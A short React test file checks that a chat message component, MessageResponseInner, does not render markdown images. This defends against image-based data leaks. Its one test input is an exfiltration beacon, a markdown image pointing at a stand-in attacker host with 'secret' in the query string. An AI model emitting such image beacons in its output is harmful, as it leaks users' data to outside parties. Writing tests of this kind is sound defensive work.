import { render } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import MessageResponseInner from "./MessageResponseInner";

describe("MessageResponseInner", () => {
  it("does not render markdown images", () => {
    const { container } = render(
      <MessageResponseInner>
        {"![beacon](https://attacker.example/leak?q=secret)"}
      </MessageResponseInner>,
    );

    expect(container.querySelector("img")).toBeNull();
  });
});
